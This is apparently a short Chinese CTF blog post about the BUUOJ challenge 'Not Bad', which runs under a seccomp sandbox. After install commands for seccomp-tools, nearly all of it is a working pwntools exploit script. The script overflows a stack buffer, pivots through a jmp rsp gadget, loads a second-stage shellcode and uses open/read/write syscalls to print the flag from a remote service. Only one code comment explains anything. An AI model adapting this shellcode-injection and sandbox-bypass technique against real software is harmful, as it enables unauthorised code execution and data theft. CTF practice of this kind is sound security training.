---
title: orw
tags: [ctf-pwn,stack]
date: 2023-10-18 18:11:00
categories: [ctf-pwn]
excerpt: 沙箱保护机制
---

##### 安装seccomp

```shell
sudo apt install gcc ruby-dev
gem install seccomp-tools
```

<https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad>

![](/img/orw/1.jpg)



```python
from pwn import *
#p = process("./bad")
p=remote("node4.buuoj.cn",28003)

context(arch='amd64', os='linux')
mmap=0x123000
jmp_rsp = 0x400A01
orw_payload = shellcraft.open("./flag")
orw_payload += shellcraft.read(3, mmap, 0x50)
orw_payload += shellcraft.write(1, mmap,0x50)

payload=asm(shellcraft.read(0,mmap,0x100))+asm('mov rax,0x123000;call rax')
payload=payload.ljust(0x28,b'\x00')
payload+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp')
# ret的时候，相当于pop rip，rsp就会指向返回地址下一个栈参数，也就是说，jmp rsp之后，就会执行sub rsp,0x30

p.recvuntil('Easy shellcode, have fun!')
p.sendline(payload)

shellcode=asm(orw_payload)
p.sendline(shellcode)
p.interactive()
```

